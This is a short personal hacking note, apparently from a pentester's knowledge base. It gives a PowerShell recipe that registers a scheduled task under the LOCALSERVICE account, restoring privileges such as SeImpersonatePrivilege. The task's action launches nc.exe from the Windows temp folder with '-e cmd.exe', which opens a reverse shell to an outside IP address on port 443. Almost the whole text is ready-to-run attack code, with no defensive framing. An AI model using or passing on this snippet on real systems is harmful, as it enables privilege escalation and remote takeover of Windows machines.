# service account privileges restore using scheduled task with powershell require seimpersonate privilege for task using principal
```powershell
# Create a list of privileges
[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"
# Create a Principal for the task 
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
# Create an action for the task 
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\windows\temp\nc.exe 192.168.69.69 443 -e cmd.exe`""
# Create the task
Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal
# Start the task
Start-ScheduledTask -TaskName "GrantAllPerms"
```

# References
- [20221003151079](/zet/20221003151079/README.md) service account privileges restore using scheduled task with powershell
- ~/kb/hacking/windows/service-account-privileges.md

Tags:
    #assorted #hacking #windows #service
